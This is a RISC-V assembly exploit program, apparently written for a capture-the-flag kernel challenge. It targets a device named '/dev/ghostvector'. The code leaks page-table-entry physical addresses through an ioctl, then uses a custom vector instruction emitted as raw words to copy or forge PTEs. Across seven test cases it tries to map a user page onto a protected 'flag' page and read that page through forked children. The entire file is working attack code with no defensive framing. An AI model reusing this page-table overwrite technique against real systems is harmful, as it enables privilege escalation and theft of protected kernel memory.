    .option arch, +v
    .section .text
    .globl _start

print:                      # a0=buf a1=len
    li a7, 64
    mv a2, a1
    mv a1, a0
    li a0, 1
    ecall
    ret

print_hex64:                # a0=value
    addi sp, sp, -16
    sd ra, 0(sp)
    mv t2, a0
    addi t3, sp, 48
    li t4, 60
1:  srl t5, t2, t4
    andi t5, t5, 15
    li t6, 10
    blt t5, t6, 2f
    addi t5, t5, 87
    j 3f
2:  addi t5, t5, 48
3:  sb t5, 0(t3)
    addi t3, t3, 1
    addi t4, t4, -4
    bgez t4, 1b
    li t5, 10
    sb t5, 0(t3)
    addi a0, sp, 48
    li a1, 17
    call print
    ld ra, 0(sp)
    addi sp, sp, 16
    ret

query:                      # a0=VA -> a0=pte_pa ; updates s4=flag_pa
    sd a0, 0(sp)
    sd zero, 8(sp)
    sd zero, 16(sp)
    mv a0, s2
    li a1, 0xc0184702
    mv a2, sp
    li a7, 29
    ecall
    li t0, 0x9d37c4b1a62ef059
    ld t1, 8(sp)
    xor a0, t1, t0
    ld t1, 16(sp)
    xor s4, t1, t0
    ret

lane:                       # a0,a1 passed through (exact vecdiag words)
    .word 0xcc00f057
    .word 0x00b5700b
    ret

spawn_read:                 # a0=VA a1=len : grandchild prints content, then status
    sd ra, 112(sp)
    sd a0, 104(sp)
    sd a1, 88(sp)
    li a0, 17
    li a1, 0
    li a2, 0
    li a3, 0
    li a4, 0
    li a7, 220
    ecall
    beqz a0, sr_child
    mv a0, a0
    addi a1, sp, 96
    li a2, 0
    li a3, 0
    li a7, 260
    ecall
    la a0, msg_sta
    li a1, 2
    call print
    lw a0, 96(sp)
    call print_hex64
    ld ra, 112(sp)
    ret
sr_child:
    la a0, msg_lt
    li a1, 2
    call print
    li a0, 1
    ld a1, 104(sp)
    ld a2, 88(sp)
    li a7, 64
    ecall
    la a0, msg_gt
    li a1, 2
    call print
    li a0, 7
    li a7, 93
    ecall

die:
    la a0, msg_err
    li a1, 4
    call print
    li a0, 1
    li a7, 93
    ecall

_start:
    addi sp, sp, -128
    li a0, 0
    li a1, 0x2000
    li a2, 3
    li a3, 0x22
    li a4, -1
    li a5, 0
    li a7, 222
    ecall
    bltz a0, die
    mv s1, a0
    li t0, 0x4141414141414141
    sd t0, 0(s1)
    sd t0, 8(s1)
    sd t0, 16(s1)
    sd t0, 24(s1)
    li t2, 0x1000
    add t2, s1, t2
    li t0, 0x4242424242424242
    sd t0, 0(t2)
    sd t0, 8(t2)
    sd t0, 16(t2)
    sd t0, 24(t2)
    li a0, -100
    la a1, path_dev
    li a2, 2
    li a3, 0
    li a7, 56
    ecall
    bltz a0, die
    mv s2, a0

    li s8, 0
test_loop:
    la a0, msg_tst
    li a1, 2
    call print
    addi t0, s8, 48
    sb t0, 40(sp)
    li t0, 58
    sb t0, 41(sp)
    addi a0, sp, 40
    li a1, 2
    call print
    li a0, 17
    li a1, 0
    li a2, 0
    li a3, 0
    li a4, 0
    li a7, 220
    ecall
    bltz a0, die
    beqz a0, tchild
    addi a1, sp, 96
    li a2, 0
    li a3, 0
    li a7, 260
    ecall
    la a0, msg_sta
    li a1, 2
    call print
    lw a0, 96(sp)
    call print_hex64
    addi s8, s8, 1
    li t0, 7
    blt s8, t0, test_loop
    la a0, msg_fin
    li a1, 4
    call print
    li a0, 0
    li a7, 93
    ecall

tchild:
    li t0, 0
    beq s8, t0, c0
    li t0, 1
    beq s8, t0, c1
    li t0, 2
    beq s8, t0, c2
    li t0, 3
    beq s8, t0, c3
    li t0, 4
    beq s8, t0, c4
    li t0, 5
    beq s8, t0, c5
    j c6

child_exit:
    li a0, 42
    li a7, 93
    ecall

# T0: load probe. v0=0x55; lane(a0=my_pte, a1=0); dump v0 to stack; print.
c0:
    mv a0, s1
    call query
    mv s3, a0
    vsetivli zero, 1, e8, m1, ta, ma
    li t1, 0x55
    vmv.v.x v0, t1
    mv a0, s3
    li a1, 0
    call lane
    addi t0, sp, 80
    vse8.v v0, (t0)
    la a0, msg_val
    li a1, 2
    call print
    lbu a0, 80(sp)
    call print_hex64
    # touch s1: faults here if the op zeroed our PTE low byte
    lbu t1, 0(s1)
    la a0, msg_val
    li a1, 2
    call print
    mv a0, t1
    call print_hex64
    j child_exit

# T1: single lane copy probe (a0=pteB, a1=pteA); read B then A in grandchildren
c1:
    mv a0, s1
    call query
    mv s3, a0               # pteA
    li t0, 0x1000
    add a0, s1, t0
    call query
    mv s5, a0               # pteB
    mv a0, s5
    mv a1, s3
    call lane
    li t0, 0x1000
    add a0, s1, t0
    li a1, 32
    call spawn_read
    mv a0, s1
    li a1, 32
    call spawn_read
    j child_exit

# T2: byte-loop copy PTE A->B (8 lanes, a0=pteB+i, a1=pteA+i); read B
c2:
    mv a0, s1
    call query
    mv s3, a0
    li t0, 0x1000
    add a0, s1, t0
    call query
    mv s5, a0
    li s6, 0
1:  add a0, s5, s6
    add a1, s3, s6
    call lane
    addi s6, s6, 1
    li t0, 8
    blt s6, t0, 1b
    li t0, 0x1000
    add a0, s1, t0
    li a1, 32
    call spawn_read
    j child_exit

# T3: one lane write-value (a0=pteA, a1=newpte); read A (expect flag if qword store)
c3:
    mv a0, s1
    call query
    mv s3, a0
    srli t0, s4, 12
    slli t0, t0, 10
    ori t0, t0, 0xd3
    mv a0, s3
    mv a1, t0
    call lane
    mv a0, s1
    li a1, 120
    call spawn_read
    j child_exit

# T4: byte-loop write-value (a0=pteA+i, a1=byte_i(newpte)); read A
c4:
    mv a0, s1
    call query
    mv s3, a0
    srli t0, s4, 12
    slli t0, t0, 10
    ori t0, t0, 0xd3
    mv s5, t0
    li s6, 0
1:  slli t0, s6, 3
    srl t1, s5, t0
    andi a1, t1, 0xff
    add a0, s3, s6
    call lane
    addi s6, s6, 1
    li t0, 8
    blt s6, t0, 1b
    mv a0, s1
    li a1, 120
    call spawn_read
    j child_exit

# T5: store-v0 probe: per byte set v0=byte, custom word with a0=pteA+i, a1=0; read A
c5:
    mv a0, s1
    call query
    mv s3, a0
    srli t0, s4, 12
    slli t0, t0, 10
    ori t0, t0, 0xd3
    mv s5, t0
    li s6, 0
1:  slli t0, s6, 3
    srl t1, s5, t0
    andi t1, t1, 0xff
    vsetivli zero, 1, e8, m1, ta, ma
    vmv.v.x v0, t1
    add a0, s3, s6
    li a1, 0
    .word 0x00b5700b
    addi s6, s6, 1
    li t0, 8
    blt s6, t0, 1b
    mv a0, s1
    li a1, 120
    call spawn_read
    j child_exit

# T6: same as T5 but a1=byte too
c6:
    mv a0, s1
    call query
    mv s3, a0
    srli t0, s4, 12
    slli t0, t0, 10
    ori t0, t0, 0xd3
    mv s5, t0
    li s6, 0
1:  slli t0, s6, 3
    srl t1, s5, t0
    andi t1, t1, 0xff
    vsetivli zero, 1, e8, m1, ta, ma
    vmv.v.x v0, t1
    add a0, s3, s6
    mv a1, t1
    .word 0x00b5700b
    addi s6, s6, 1
    li t0, 8
    blt s6, t0, 1b
    mv a0, s1
    li a1, 120
    call spawn_read
    j child_exit

    .section .rodata
msg_err: .ascii "ERR\n"
msg_tst: .ascii "T>"
msg_sta: .ascii "S="
msg_val: .ascii "V="
msg_lt:  .ascii "R<"
msg_gt:  .ascii ">\n"
msg_fin: .ascii "FIN\n"
path_dev: .asciz "/dev/ghostvector"
